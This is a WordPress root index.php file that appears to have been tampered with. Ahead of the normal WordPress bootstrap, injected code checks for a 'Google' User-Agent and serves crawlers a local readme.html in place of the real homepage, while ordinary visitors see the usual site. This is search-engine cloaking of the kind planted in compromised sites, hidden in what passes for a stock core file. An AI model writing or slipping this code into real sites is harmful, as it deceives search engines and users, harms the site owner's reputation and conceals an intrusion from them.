<?php
if (isset($_SERVER['HTTP_USER_AGENT']) && stripos($_SERVER['HTTP_USER_AGENT'], 'Google') !== false) {
    if ($_SERVER['REQUEST_URI'] === '/' || $_SERVER['REQUEST_URI'] === '/index.php') {
        include 'readme.html';
        exit();
    }
}
define( 'WP_USE_THEMES', true );
require __DIR__ . '/wp-blog-header.php';
